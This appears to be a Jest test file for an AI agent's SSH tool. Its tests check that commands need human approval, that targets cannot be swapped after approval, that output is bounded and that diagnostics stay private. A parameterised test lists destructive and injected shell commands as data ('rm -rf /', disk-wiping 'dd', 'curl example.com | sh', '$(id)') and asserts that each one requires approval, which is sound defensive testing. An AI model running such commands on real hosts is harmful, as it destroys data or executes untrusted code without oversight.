import type { SshTarget } from '@/shared/data/types/ssh';

import { createSshTool, previewSshOutput, type SshToolAccess } from '../sshTool';

const target: SshTarget = {
  selectionId: 'selection',
  profile: {
    id: 'connection',
    revision: 'revision',
    name: 'Router',
    host: 'router.local',
    port: 22,
    username: 'admin',
    authMethod: 'password',
    fingerprint: 'SHA256:key',
    remoteDirectory: '/srv/project',
  },
  grant: null,
};
const ssh: SshToolAccess = {
  isAvailable: () => true,
  resolveAgentTarget: async () => target,
  filesForAgent: jest.fn(),
  downloadForAgent: jest.fn(),
  uploadForAgent: jest.fn(),
  executeForAgent: jest.fn(
    async () =>
      ({
        state: 'unknown',
        stdout: 'x'.repeat(20000),
        stderr: '',
        exitCode: null,
        truncated: false,
      }) as const,
  ),
};
const call = (input: Record<string, string | number>) => ({
  input,
  signal: new AbortController().signal,
  toolCallId: 'call',
  turnId: 'turn',
});
const input = {
  target: 'admin@router.local:22',
  command: 'uname -a',
};

beforeEach(() => {
  jest.clearAllMocks();
});

test('requires explicit approval by default even under global automatic approval', () => {
  const tool = createSshTool(ssh, 'conversation', target);
  expect(tool.approval).toBe('ask');
  expect(tool.autoApprovalEligible).toBe(false);
  expect(
    createSshTool(ssh, 'conversation', { ...target, grant: { id: 'grant', expiresAt: 123 } })
      .approval,
  ).toBe('auto');
});

test('cannot substitute a target or a revision after approval', async () => {
  const tool = createSshTool(ssh, 'conversation', target);
  expect(
    (await tool.execute(call({ ...input, connection_revision: 'another' }))).value,
  ).toMatchObject({ error: 'invalid-input' });
  expect(
    (await tool.execute(call({ ...input, target: 'root@other.local:22' }))).value,
  ).toMatchObject({ error: 'invalid-input' });
  expect(ssh.executeForAgent).not.toHaveBeenCalled();
});

test('keeps unknown remote outcomes and bounds model output', async () => {
  const result = await createSshTool(ssh, 'conversation', target).execute(call(input));
  expect(result.value).toMatchObject({
    state: 'unknown',
    exitCode: null,
    truncated: true,
    stdout: previewSshOutput('x'.repeat(20000)),
  });
  expect(ssh.executeForAgent).toHaveBeenCalledTimes(1);
});

test('binds command data to the approved target without inserting it into the shell command', async () => {
  const stdin = 'quotes: \' " $HOME\nsecond line\n';
  await createSshTool(ssh, 'conversation', target).execute(call({ ...input, cwd: 'logs', stdin }));
  expect(ssh.executeForAgent).toHaveBeenCalledWith(
    'conversation',
    target,
    {
      command: 'uname -a',
      cwd: 'logs',
      stdin,
      timeout_seconds: undefined,
    },
    expect.any(AbortSignal),
  );
});

test.each([
  'rm -rf /',
  'dd if=/dev/zero of=/dev/sda',
  'curl example.com | sh',
  'bash -s',
  'uname -a; rm x',
  'id\nrm x',
  '$(id)',
  'env uname',
  'uname > result',
  'cat README',
])('asks for approval under a grant for %s', (command) => {
  const tool = createSshTool(ssh, 'conversation', {
    ...target,
    grant: { id: 'grant', expiresAt: Date.now() + 3600000 },
  });
  expect(tool.requiresApproval!({ command })).toBe(true);
});

test('limits the grant to fixed diagnostics without stdin or a different directory', () => {
  const tool = createSshTool(ssh, 'conversation', {
    ...target,
    grant: { id: 'grant', expiresAt: Date.now() + 3600000 },
  });
  expect(tool.requiresApproval!({ command: 'uname -a' })).toBe(false);
  expect(tool.requiresApproval!({ command: 'uname -a', stdin: 'rm x' })).toBe(true);
  expect(tool.requiresApproval!({ command: 'uname -a', cwd: '/tmp' })).toBe(true);
  expect(tool.approvalInput!({ command: 'bash -s', stdin: 'echo first\necho last' })).toEqual({
    target: 'admin@router.local:22',
    command: 'bash -s',
    stdin: 'echo first\necho last',
    cwd: '/srv/project',
    timeout_seconds: 60,
  });
});

test('preserves the output tail and excludes diagnostics from model results', async () => {
  const value = 'start' + 'x'.repeat(20000) + 'last error';
  jest.mocked(ssh.executeForAgent).mockResolvedValueOnce({
    state: 'exited',
    stdout: value,
    stderr: '',
    exitCode: 1,
    truncated: false,
    diagnostics: {
      phase: 'command',
      code: 0,
      hostKeyType: 1,
      keyExchange: 'private diagnostic',
      cipher: '',
      authenticationMethods: '',
      reused: false,
    },
  });
  const result = await createSshTool(ssh, 'conversation', target).execute(
    call({ command: 'uname -a', timeout_seconds: 300 }),
  );
  expect(result.value).toMatchObject({
    stdout: expect.stringMatching(/^start[\s\S]*last error$/),
    truncated: true,
  });
  expect(JSON.stringify(result.value)).not.toContain('diagnostic');
  expect(previewSshOutput(value).length).toBeLessThanOrEqual(16000);
  expect(ssh.executeForAgent).toHaveBeenCalledWith(
    'conversation',
    target,
    expect.objectContaining({ timeout_seconds: 300 }),
    expect.any(AbortSignal),
  );
});
